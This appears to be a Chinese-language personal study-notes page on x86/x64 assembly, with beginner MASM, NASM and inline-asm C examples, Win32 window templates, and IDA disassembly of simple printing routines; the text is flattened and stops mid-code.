A1\tdb\t&quot;I_am_Dqx_Gh0st&quot;,0len\t=\tlengthof A1B1\tdb\tlen dup (0);-------------------------------------------------------- ;function;--------------------------------------------------------toupper proto source:PTR BYTE;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\ttoupper ,addr A1\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------;Str_trim;从字符串末尾删除所有与给定分隔符匹配的字符。;返回：无;-------------------------------------;---------------------------------;Str_ucase;将空字节结束的字符串转换为大写字母。;返回：无;---------------------------------toupper proc uses eax esi,\tpStr:PTR BYTE\tmov esi,pStrwork:\tmov al, [esi] ;取字符\tcmp al, 0 ;字符串是否结束？\tje over ;是：退出\tcmp al, &#x27;A&#x27; ;小于&quot;a&quot; ？\tjb next\tcmp al, &#x27;Z&#x27; ;大于&quot;z&quot; ？\tja next\tor byte ptr [esi], 00100000b ;转换字符next: inc esi ;下一个字符\tjmp workover:\trettoupper endp;--------------------------------------------------------end\tstart;-------------------------------------------------------- __asm 两数相加1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int main()&#123;\tprintf(&quot;hello &quot;);\tint x,y,z;\tscanf(&quot;%d %d&quot;,&amp;x,&amp;y);\t__asm\t&#123; mov eax,x add eax,y mov z,eax\t&#125;\tprintf(&quot;%d &quot;,z);\tsystem(&quot;pause&quot;);\treturn 0;&#125; 这是一个简单的相加 __asm 数组求和12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;windows.h&gt;int func(int*,int);int main()&#123;\tint arr[]=&#123;2,4,6,8,10&#125;;\tint len=sizeof(arr)/sizeof(arr[0]);\tint sum=0;\tprintf(&quot;wecome to my world &quot;);\tsum=func(arr,len);\tprintf(&quot;%d &quot;,sum);\tsystem(&quot;pause&quot;);\treturn 0;&#125;int func(int *arr,int len)&#123;\tint sum=0;\t__asm\t&#123; mov esi,arr mov ecx,len mov ebx,0 mov eax,0 flag: add eax,[esi+ebx*4] inc ebx loop flag mov sum,eax\t&#125;\treturn sum;&#125; 别看你在func函数里面只写了几句汇编,其实你的func函数还是有很多的东西的 好比寄存器的入栈,函数栈的开辟 __asm 10进制value-&gt;2进制字符串1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#include&lt;windows.h&gt;void func(int,char*);int main()&#123;\tchar str[32]=&#123;0&#125;;\tprintf(&quot;wecome to my world &quot;);\tfunc(52,str);\tprintf(&quot;Dec %d= Bin %s &quot;,52,str);\tsystem(&quot;pause&quot;);\treturn 0;&#125;void func(int value,char *string)&#123;\t__asm\t&#123; mov esi,string mov eax,value mov byte ptr [esi],&#x27;0&#x27; //数值最高位是0,字符串最低位是0 bsr ecx,value jz over mov byte ptr[esi],&#x27;1&#x27; //数值最高位是1,字符串最低位是1 flag: bt value,0 adc byte ptr[esi+ecx],&#x27;0&#x27; //把字符串从最高位往最低位初始化 //数值从最低位到最高位读取 shr value,1 loop flag over:\t&#125;&#125; 关于bsr指令和bt指令,见目录寻找 取余运算,难看C码 12if ((c+1) % 8 == 0) printf(&quot; &quot;); IDA码 1234add rax, 1and eax, 7 ; 这是一个取模的运输test rax, rax ; rax=0,ZF=1jnz short loc_401384 7的二进制00000111 当一个数是0,&amp;7才会是0,其他情况都是非0 所以从0到111,就是一个循环 处理 输入&#x2F;输出 溢出123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104; console2.asmsection .data msg1 db &quot;Hello, World!&quot;,10,0 msg2 db &quot;Your turn (only a-z): &quot;,0 msg3 db &quot;You answered: &quot;,0 inputlen equ 10 ;inputbuffer\tNL db 0xa section .bss input resb inputlen+1 ;provide space for ending 0section .text global main main: push\trbp mov rbp,rsp\tmov rdi, msg1 ; print first string call prints mov rdi, msg2\t; print second string, no NL call prints mov rdi, input ; address of inputbuffer\tmov rsi, inputlen\t; length of inputbuffer call reads ; wait for input mov rdi, msg3 ; print third string and add the input string\tcall prints mov rdi, input ; print the inputbuffer\tcall prints mov rdi,NL ; print NL\tcall prints leave ret;----------------------------------------------------------prints:push\trbpmov rbp, rsppush\tr12 ; callee saved; Count characters xor rdx, rdx ; length in rdx mov r12, rdi .lengthloop: cmp byte [r12], 0 je .lengthfound inc rdx inc r12 jmp .lengthloop.lengthfound: ; print the string, length in rdx cmp rdx, 0 ; no string (0 length) je .done mov rsi,rdi ; rdi contains address of string mov rax, 1 ; 1 = write mov rdi, 1 ; 1 = stdout syscall.done:pop r12leave ret;----------------------------------------------------------reads:section .datasection .bss .inputchar resb 1 section .textpush\trbpmov\trbp, rsp push\tr12 ; callee saved push\tr13 ; callee saved push\tr14 ; callee saved mov r12, rdi\t; address of stringbuffer mov r13, rsi ; max length in r13 xor r14, r14 ; character counter.readc: mov rax, 0 ; read mov rdi, 1 ; stdin lea rsi, [.inputchar] ; address of input mov rdx, 1 ; # of characters to read syscall mov al, [.inputchar] ; char is NL? cmp al, byte[NL] je .done ; NL end cmp al, 97 ; lower than a? jl .readc ; ignore it cmp al, 122 ; higher than z? jg .readc ; ignore it inc r14 ; inc counter cmp r14, r13 ja .readc ; buffer max reached, ignore mov byte [r12], al ; safe the char in the buffer inc r12 ; point to next char in buffer jmp .readc .done: inc r12 mov byte [r12],0 ; add end 0 to stringbuffer pop r14 ; callee saved pop r13 ; callee saved pop r12 ; callee saved leave ret 他的思路 它使用了一些寄存器来保存参数 用r12,r13来捕捉缓冲区的字符串长度,缓冲区的字符串地址 用r14来做字符串缓冲区的指针,满足条件就移动r14来填入输入的数据 关于输入,他把你的输入作为单个字符,传入一个char buff&#x3D;0的缓冲区,然后检buff 如果buff是换行符就读取结束 如果读取是不满足条件的字符就读取下一个数据,字符串缓冲区的指针不发生变化,继续读取下一个字符 如果满足对应的字符,查看输入的字符串长度是否超过了,如果超过了,不移动指针,继续读取下一个字符 如果没有超过,就移动指针,往字符串地址里面天厨char 的buff 就是这样一个解决读取溢出的 读取是读取到一个一旦长度的buff区域 ,读取溢出解决,输出就解决了 win32helloword12345678910111213141516171819202122232425262728293031;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff Hello.asm; Link /subsystem:windows Hello.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;c;对于上面的lib,inc还不是很理解;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段.data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;A_Title db\t&#x27;My_First_Box !&#x27;,0A_Text db\t&#x27;Hello, Dqx_Ghost !&#x27;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tstart: invoke\tMessageBox, NULL, offset A_Text, offset A_Title, MB_OK ;传递了4个参数,NULL,标题,内容,MB_OK invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; IDA 12345678910public startstart proc nearpush 0 ; 参数1push offset Caption ; 参数2,标题&quot;My_First_Box !&quot;push offset Text ; 参数3,内容&quot;Hello, Dqx_Ghost !&quot;push 0 ; 参数4,hwnd????call MessageBoxApush 0 ; uExitCodecall ExitProcessstart endp 第一个窗口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Sample code for &lt; Win32ASM Programming 3rd Edition&gt;; by 罗云彬, http://www.win32asm.com.cn;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; FirstWindow.asm; 窗口程序的模板代码;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff FirstWindow.asm; Link /subsystem:windows FirstWindow.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude gdi32.incincludelib\tgdi32.libinclude user32.incincludelib\tuser32.libinclude kernel32.incincludelib\tkernel32.lib;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data?hInstance\tdd ?\t;用来接收资源模块的地址hWinMain\tdd ?\t;hWinMain会接受一个窗口的地址 .constszClassName\tdb\t&#x27;MyClass&#x27;,0szCaptionMain\tdb\t&#x27;My first Window !&#x27;,0szText db\t&#x27;Win32 Assembly, Simple and powerful !&#x27;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 窗口过程;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_ProcWinMain\tproc\tuses ebx edi esi hWnd,uMsg,wParam,lParam local\t@stPs:PAINTSTRUCT local\t@stRect:RECT local\t@hDc mov\teax,uMsg;******************************************************************** .if\teax ==\tWM_PAINT invoke\tBeginPaint,hWnd,addr @stPs mov\t@hDc,eax invoke\tGetClientRect,hWnd,addr @stRect invoke\tDrawText,@hDc,addr szText,-1,\\ addr @stRect,\\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke\tEndPaint,hWnd,addr @stPs;******************************************************************** .elseif\teax ==\tWM_CLOSE invoke\tDestroyWindow,hWinMain invoke\tPostQuitMessage,NULL;******************************************************************** .else invoke\tDefWindowProc,hWnd,uMsg,wParam,lParam ret .endif;******************************************************************** xor\teax,eax ret_ProcWinMain\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_WinMain\tproc local\t@stWndClass:WNDCLASSEX local\t@stMsg:MSG ;参数0,代表0号模块 invoke\tGetModuleHandle,NULL mov\thInstance,eax ;参数 ;结构体起始地址 ;sizeof(结构体) ;功能初始化结构体为0 invoke\tRtlZeroMemory,addr @stWndClass,sizeof @stWndClass;********************************************************************; 注册窗口类;重要的参数;hInstance;@stWndClass.lpfnWndProc;@stWndClass.lpszClassName;******************************************************************** invoke\tLoadCursor,0,IDC_ARROW mov\t@stWndClass.hCursor,eax push\thInstance pop\t@stWndClass.hInstance mov\t@stWndClass.cbSize,sizeof WNDCLASSEX mov\t@stWndClass.style,CS_HREDRAW or CS_VREDRAW mov\t@stWndClass.lpfnWndProc,offset _ProcWinMain mov\t@stWndClass.hbrBackground,COLOR_WINDOW + 1 mov\t@stWndClass.lpszClassName,offset szClassName ;参数 ;一个已经初始化好的结构体 ;功能:把已经准备好的结构体信息给zhuche3函数 invoke\tRegisterClassEx,addr @stWndClass;********************************************************************; 建立并显示窗口;重要参数;szClassName 这个参数好像不怎么重要,就是一个名字,或者是一个指针的名字;hInstance;******************************************************************** invoke\tCreateWindowEx,WS_EX_CLIENTEDGE,offset szClassName,offset szCaptionMain,\\ WS_OVERLAPPEDWINDOW,\\ 100,100,600,400,\\ NULL,NULL,hInstance,NULL mov\thWinMain,eax ;重要的参数是hWinMain ;参数是窗口的地址 invoke\tShowWindow,hWinMain,SW_SHOWNORMAL invoke\tUpdateWindow,hWinMain;********************************************************************; 消息循环;******************************************************************** .while\tTRUE ;参数\t@stMsg, ;函数的功能获取信息然后初始化@stMsg invoke\tGetMessage,addr @stMsg,NULL,0,0 .break\t.if eax\t== 0 invoke\tTranslateMessage,addr @stMsg invoke\tDispatchMessage,addr @stMsg .endw ret_WinMain\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;start: call\t_WinMain invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 第二个窗口修改IP的方法? call\t一个位置 然后\tjmp到一个位置 最后\tret xx 这就让ip发生了鬼鬼祟祟的变化 这就是回调函数? asm-&gt;avx打印16进制1234567891011121314151617.text:000000000040137C print_xmm proc near ; CODE XREF: apply_mxcsr+50↑p.text:000000000040137C push rbp.text:000000000040137D mov rbp, rsp.text:0000000000401380 mov rdi, offset hex ; &quot;0x&quot;.text:000000000040138A call _printf.text:000000000040138F mov ecx, 8 ;它只会打印8字节,默认的.text:0000000000401394.text:0000000000401394 print_xmm_loop: ; CODE XREF: print_xmm+29↓j.text:0000000000401394 xor rdi, rdi.text:0000000000401397 mov dil, [rcx+404143h].text:000000000040139E push rcx.text:000000000040139F call print_hex\t;一个字节字节的打印.text:00000000004013A4 pop rcx.text:00000000004013A5 loop print_xmm_loop.text:00000000004013A7 leave.text:00000000004013A8 retn.text:00000000004013A8 print_xmm endp 12345678910111213141516171819202122232425262728.text:000000000040142B print_hex proc near ; CODE XREF: print_xmm+23↑p.text:000000000040142B.text:000000000040142B var_4 = byte ptr -4.text:000000000040142B.text:000000000040142B ; __unwind &#123;.text:000000000040142B endbr64.text:000000000040142F push rbp.text:0000000000401430 mov rbp, rsp.text:0000000000401433 sub rsp, 10h.text:0000000000401437 mov eax, edi.text:0000000000401439 mov [rbp+var_4], al.text:000000000040143C cmp [rbp+var_4], 15.text:0000000000401440 ja short loc_40144C.text:0000000000401442 mov edi, 30h ; &#x27;0&#x27; ; c.text:0000000000401447 call _putchar.text:000000000040144C.text:000000000040144C loc_40144C: ; CODE XREF: print_hex+15↑j.text:000000000040144C movzx eax, [rbp+var_4].text:0000000000401450 mov esi, eax.text:0000000000401452 lea rdi, format ; &quot;%x&quot;.text:0000000000401459 mov eax, 0.text:000000000040145E call _printf.text:0000000000401463 nop.text:0000000000401464 leave.text:0000000000401465 retn.text:0000000000401465 ; &#125; // starts at 40142B.text:0000000000401465 print_hex endp 打印二进制123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960.text:00000000004013A9 print_mxcsr proc near ; CODE XREF: apply_mxcsr+6C↑p.text:00000000004013A9 ; apply_mxcsr+88↑p.text:00000000004013A9.text:00000000004013A9 var_18 = qword ptr -18h.text:00000000004013A9 var_10 = qword ptr -10h.text:00000000004013A9 var_8 = qword ptr -8.text:00000000004013A9.text:00000000004013A9 ; __unwind &#123;.text:00000000004013A9 endbr64.text:00000000004013AD push rbp.text:00000000004013AE mov rbp, rsp.text:00000000004013B1 sub rsp, 20h.text:00000000004013B5 mov [rbp+var_18], rdi.text:00000000004013B9 mov [rbp+var_10], 0Fh.text:00000000004013C1 jmp short loc_401417.text:00000000004013C3 ; ---------------------------------------------------------------------------.text:00000000004013C3.text:00000000004013C3 loc_4013C3: ; CODE XREF: print_mxcsr+73↓j.text:00000000004013C3 mov rax, [rbp+var_10].text:00000000004013C7 mov edx, eax.text:00000000004013C9 mov rax, [rbp+var_18].text:00000000004013CD mov ecx, edx ;用于判断空格输出.text:00000000004013CF sar rax, cl .text:00000000004013D2 mov [rbp+var_8], rax.text:00000000004013D6 mov rax, [rbp+var_10].text:00000000004013DA add rax, 1.text:00000000004013DE and eax, 3.text:00000000004013E1 test rax, rax.text:00000000004013E4 jnz short loc_4013F0.text:00000000004013E6 mov edi, 20h ; &#x27; &#x27; ; c.text:00000000004013EB call _putchar.text:00000000004013F0.text:00000000004013F0 loc_4013F0: ; CODE XREF: print_mxcsr+3B↑j.text:00000000004013F0 mov rax, [rbp+var_8].text:00000000004013F4 and eax, 1.text:00000000004013F7 test rax, rax.text:00000000004013FA jz short loc_401408.text:00000000004013FC mov edi, 31h ; &#x27;1&#x27; ; c.text:0000000000401401 call _putchar.text:0000000000401406 jmp short loc_401412.text:0000000000401408 ; ---------------------------------------------------------------------------.text:0000000000401408.text:0000000000401408 loc_401408: ; CODE XREF: print_mxcsr+51↑j.text:0000000000401408 mov edi, 30h ; &#x27;0&#x27; ; c.text:000000000040140D call _putchar.text:0000000000401412.text:0000000000401412 loc_401412: ; CODE XREF: print_mxcsr+5D↑j.text:0000000000401412 sub [rbp+var_10], 1.text:0000000000401417.text:0000000000401417 loc_401417: ; CODE XREF: print_mxcsr+18↑j.text:0000000000401417 cmp [rbp+var_10], 0.text:000000000040141C jns short loc_4013C3.text:000000000040141E mov edi, 0Ah ; 换行.text:0000000000401423 call _putchar.text:0000000000401428 nop.text:0000000000401429 leave.text:000000000040142A retn.text:000000000040142A ; &#125; // starts at 4013A9.text:000000000040142A print_mxcsr endp 实验的收获对于重复的代码,尽量少些,多去调用 循环遍历的方法jcxz+jmp假设字符串 最后以0来结尾 可能适用于你不知道字符串的长度,然后用0来表示标志位的结尾 123456789101112 push si push diflag:\tmov cx,ds:[si]\tmov es:[di],cx\tjcxz over\tinc si\tadd di,2over:\tpop di\tpop si\tret loop与cx可能适用于你知道cx的长度,然后去遍历它的字符串长度 12345678910111213 push si push di mov cx,16flag:\tmov ax,ds:[si]\tmov es:[di],ax\tinc si\tadd di,2\tloop flagover:\tpop di\tpop si\tret 数据获取string dup (0)对于 10000000000000000 然后填入数据 100000000002222222 获取数据时,我们常常jcxz一下 于是获取完毕 但是下一次获取的时候 数据89 100000000022222289 前面的(上一次的)数影响了 于是怎么办? 就每次填入数据的时候,就是初始化数据的时候,就多写一个标志0 10000022222222 第二次初始化 10000022222089 在89前面就有一个0作为标志位 程序死机的原因你没有写 12mov ax,4c00hint 21h 关于该数据要用多少位的寄存器存放? 一个无符号的bit位,假设n位,其最大值就是2^n-1 一个有符号的bit位,假设n位,其最大值就是2^(n-1)-1 遗留的问题(浮点数) 123456789101112#include &lt;stdio.h&gt;int main(void)&#123;\tdouble 